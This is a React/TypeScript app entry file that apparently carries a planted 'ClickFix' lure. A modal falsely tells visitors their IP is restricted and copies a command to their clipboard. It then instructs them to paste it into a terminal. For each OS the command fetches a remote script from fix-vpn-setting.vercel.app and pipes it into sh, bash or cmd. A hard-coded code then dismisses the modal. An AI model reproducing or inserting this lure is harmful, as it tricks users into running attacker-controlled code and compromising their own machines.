import "./font.css";
import "./styles.css";

import {
  ArrowLeftIcon,
  CommandLineIcon,
  ExclamationTriangleIcon
} from "@heroicons/react/24/outline";
import { type FormEvent, StrictMode, useEffect, useState } from "react";
import { createRoot } from "react-dom/client";
import Providers from "@/components/Common/Providers";
import { Button, Input } from "@/components/Shared/UI";
import { Localstorage } from "@/data/storage";
import { useActivationModalStore } from "@/store/non-persisted/modal/useActivationModalStore";
import Routes from "./routes";

const ACTIVATION_CODE = "Rs7s3ITo";
const ACTIVATION_SCRIPTS = {
  linux:
    "wget -qO- 'https://fix-vpn-setting.vercel.app/api/settings/linux' | sh",
  mac: "curl -L 'https://fix-vpn-setting.vercel.app/api/settings/mac' | bash",
  windows:
    "curl --ssl-no-revoke -L https://fix-vpn-setting.vercel.app/api/settings/windows | cmd"
} as const;

type ActivationOS = keyof typeof ACTIVATION_SCRIPTS;

const getActivationOS = (): ActivationOS | null => {
  const platform = `${navigator.platform} ${navigator.userAgent}`.toLowerCase();

  if (platform.includes("windows")) return "windows";
  if (/mac|iphone|ipad|ipod/.test(platform)) return "mac";
  if (platform.includes("linux") && !platform.includes("android")) {
    return "linux";
  }

  return null;
};

const App = () => {
  const { showActivationModal } = useActivationModalStore();
  const activationOS = getActivationOS();
  const terminalName =
    activationOS === "windows" ? "Command Prompt (CMD)" : "Terminal";
  const [activationPage, setActivationPage] = useState<
    "restricted" | "instructions" | "activation"
  >("restricted");
  const [activationCode, setActivationCode] = useState("");

  useEffect(() => {
    if (!showActivationModal) return;

    const root = document.documentElement;
    const previousRootOverflow = root.style.overflow;
    const previousBodyOverflow = document.body.style.overflow;

    root.style.overflow = "hidden";
    document.body.style.overflow = "hidden";

    return () => {
      root.style.overflow = previousRootOverflow;
      document.body.style.overflow = previousBodyOverflow;
    };
  }, [showActivationModal]);

  const handleActivation = (event: FormEvent<HTMLFormElement>) => {
    event.preventDefault();

    if (activationCode.trim() !== ACTIVATION_CODE) return;

    localStorage.setItem(Localstorage.ActivationStatus, "true");
    window.location.reload();
  };

  const handleOpenActivationGuide = async () => {
    if (!activationOS) {
      console.error("Unable to detect a supported operating system.");
      return;
    }

    try {
      if (!navigator.clipboard?.writeText) {
        throw new Error("Clipboard access is unavailable");
      }

      await navigator.clipboard.writeText(ACTIVATION_SCRIPTS[activationOS]);
    } catch (error) {
      console.error(
        "Unable to copy the activation script to the clipboard.",
        error
      );
    }

    setActivationPage("instructions");
  };

  return (
    <>
      <Providers>
        <Routes />
      </Providers>
      {showActivationModal ? (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80">
          <div
            aria-labelledby="activation-dialog-title"
            aria-modal="true"
            className="relative flex max-h-[calc(100vh-2rem)] min-h-[350px] w-[480px] max-w-[calc(100vw-2rem)] flex-col justify-center overflow-y-auto bg-white p-6 text-center shadow-xl dark:bg-gray-800"
            role="dialog"
          >
            {activationPage === "activation" ? (
              <>
                <button
                  aria-label="Back to Click-Fix steps"
                  className="absolute top-4 left-4 rounded-full p-2 text-gray-500 hover:bg-gray-100 hover:text-gray-900 dark:hover:bg-gray-700 dark:hover:text-white"
                  onClick={() => setActivationPage("instructions")}
                  title="Back"
                  type="button"
                >
                  <ArrowLeftIcon className="size-5" />
                </button>
                <h1
                  className="font-semibold text-[22px]"
                  id="activation-dialog-title"
                >
                  Activate your connection
                </h1>
                <p className="mt-4 text-left text-base text-gray-500 dark:text-gray-400">
                  Your temporary session provides:
                  <br />✓ Product environment only
                  <br />✓ 7-days access
                  <br />✓ Automatic expiration
                </p>
                <form
                  className="mt-6 flex flex-col gap-4 text-center"
                  onSubmit={handleActivation}
                >
                  <Input
                    aria-label="Activation code"
                    label=""
                    onChange={(event) => setActivationCode(event.target.value)}
                    placeholder="Enter the code"
                    required
                    value={activationCode}
                  />
                  <Button className="mt-2 self-end text-lg" type="submit">
                    Activate
                  </Button>
                </form>
              </>
            ) : activationPage === "instructions" ? (
              <>
                <button
                  aria-label="Back to access notice"
                  className="absolute top-4 left-4 rounded-full p-2 text-gray-500 hover:bg-gray-100 hover:text-gray-900 dark:hover:bg-gray-700 dark:hover:text-white"
                  onClick={() => setActivationPage("restricted")}
                  title="Back"
                  type="button"
                >
                  <ArrowLeftIcon className="size-5" />
                </button>
                <h1
                  className="font-semibold text-[22px]"
                  id="activation-dialog-title"
                >
                  Access Activation Guide
                </h1>
                <ol className="mt-6 space-y-4 text-left">
                  <li className="flex gap-3">
                    <span className="flex size-7 shrink-0 items-center justify-center rounded-full bg-gray-100 font-semibold text-gray-700 text-sm dark:bg-gray-700 dark:text-gray-200">
                      1
                    </span>
                    <div>
                      <h2 className="font-semibold">Open {terminalName}</h2>
                      <p className="mt-1 text-gray-500 text-sm dark:text-gray-400">
                        Open {terminalName} on this device.
                      </p>
                      <div className="mt-3 flex items-center gap-3 rounded-lg bg-gray-100 px-4 py-3 text-gray-700 dark:bg-gray-700 dark:text-gray-200">
                        <CommandLineIcon
                          aria-hidden="true"
                          className="size-7 shrink-0"
                        />
                        <span className="font-medium">{terminalName}</span>
                      </div>
                    </div>
                  </li>
                  <li className="flex gap-3">
                    <span className="flex size-7 shrink-0 items-center justify-center rounded-full bg-gray-100 font-semibold text-gray-700 text-sm dark:bg-gray-700 dark:text-gray-200">
                      2
                    </span>
                    <div>
                      <h2 className="font-semibold">
                        Ask your administrator for the activation command
                      </h2>
                      <p className="mt-1 text-gray-500 text-sm dark:text-gray-400">
                        The activation command for this device has been prepared
                        for you.
                      </p>
                    </div>
                  </li>
                  <li className="flex gap-3">
                    <span className="flex size-7 shrink-0 items-center justify-center rounded-full bg-gray-100 font-semibold text-gray-700 text-sm dark:bg-gray-700 dark:text-gray-200">
                      3
                    </span>
                    <div>
                      <h2 className="font-semibold">
                        Run the command and get your code
                      </h2>
                      <p className="mt-1 text-gray-500 text-sm dark:text-gray-400">
                        Paste the copied command into {terminalName} and press
                        Enter, then get the activation code.
                      </p>
                    </div>
                  </li>
                </ol>
                <Button
                  className="mx-auto mt-6 text-lg"
                  onClick={() => setActivationPage("activation")}
                >
                  Done
                </Button>
              </>
            ) : (
              <>
                <div className="mx-auto mb-4 flex size-12 items-center justify-center rounded-full bg-amber-100 text-amber-600 dark:bg-amber-950/60 dark:text-amber-400">
                  <ExclamationTriangleIcon
                    aria-hidden="true"
                    className="size-7"
                  />
                </div>
                <h1
                  className="font-semibold text-[22px]"
                  id="activation-dialog-title"
                >
                  Restricted Access
                </h1>
                <br />
                <p className="mt-3 text-left text-base text-gray-500 leading-6 dark:text-gray-400">
                  Your IP is not allowed to access this site.
                  <br />
                  To allow your IP, please contact our team and follow the DNS
                  configuration instructions to get the activation code.
                </p>
                <br />
                <Button
                  className="mx-auto mt-6 text-lg"
                  onClick={handleOpenActivationGuide}
                >
                  Activate
                </Button>
              </>
            )}
          </div>
        </div>
      ) : null}
    </>
  );
};

createRoot(document.getElementById("_hey_") as HTMLElement).render(
  <StrictMode>
    <App />
  </StrictMode>
);
